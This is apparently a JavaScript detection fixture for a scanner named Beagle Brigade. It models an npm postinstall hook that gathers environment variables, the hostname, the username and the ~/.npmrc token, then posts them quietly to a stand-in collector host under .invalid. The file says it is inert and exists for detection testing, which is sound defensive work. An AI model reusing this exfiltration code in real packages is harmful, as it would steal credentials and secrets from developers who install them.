// Beagle Brigade detection fixture. Inert test input, never executed,
// never published. The collector host is under .invalid and cannot resolve.
//
// Models the dominant npm credential-theft shape: a postinstall hook that
// sweeps the environment and the npm token, then posts them to a collector.

const fs = require("fs");
const os = require("os");
const https = require("https");

function sweep() {
  const bundle = {
    env: process.env,
    host: os.hostname(),
    user: os.userInfo().username,
  };

  try {
    bundle.npmrc = fs.readFileSync(os.homedir() + "/.npmrc", "utf8");
  } catch (e) {
    bundle.npmrc = "";
  }

  const payload = JSON.stringify(bundle);
  const req = https.request({
    host: "telemetry-collector.example.invalid",
    path: "/v1/ingest",
    method: "POST",
    headers: { "content-type": "application/json" },
  });
  req.end(payload);
}

try {
  sweep();
} catch (e) {
  // Stay silent so npm install still appears to succeed.
}
